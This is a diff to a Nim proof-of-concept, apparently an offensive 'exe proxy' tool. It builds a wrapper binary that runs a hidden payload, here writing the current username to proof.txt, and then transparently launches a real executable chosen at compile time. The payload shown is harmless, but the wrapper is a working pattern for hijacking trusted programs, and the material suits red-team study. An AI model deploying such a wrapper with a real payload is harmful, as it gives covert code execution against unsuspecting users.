@@ -1,8 +1,10 @@
 import os
 import osproc
 import streams
-import strformat
 import winim/lean
+
+# set by compile parameter -d:proxybin=xxx
+const proxyBin {.strdefine.}: string = "C:\\Windows\\system32\\whoami.exe"
 
 proc p4yl0ad() =
     # whoami from https://github.com/chvancooten/NimPlant
@@ -17,22 +19,16 @@ proc p4yl0ad() =
         if character == 0: break
         username.add(char(character))
 
-    MessageBox(0, fmt"The user '{username}' shot first", "nimexeproxy", 0)
-
-proc run(cmd: string, args: seq[string]): (int, string) =
-    let process = osproc.startProcess(cmd, args = args, options = {poUsePath, poStdErrToStdOut})
-    defer: process.close()
-    let retCode = process.waitForExit()
-    return (retCode, process.outputStream.readAll())
-
-# binary path set by build.sh
-let proxyBin = "{{BINPATH}}"
+    var f = open("proof.txt", FileMode.fmWrite)
+    f.write(username)
+    f.close()
 
 # run the payload
 p4yl0ad()
 
 # run the real binary
-let args = commandLineParams()
-let (retCode, output) = run(proxyBin, args)
-echo output
+let process = osproc.startProcess(proxyBin, args = commandLineParams(), options = {poUsePath, poStdErrToStdOut})
+let retCode = process.waitForExit()
+echo process.outputStream.readAll()
+process.close()
 quit(retCode)
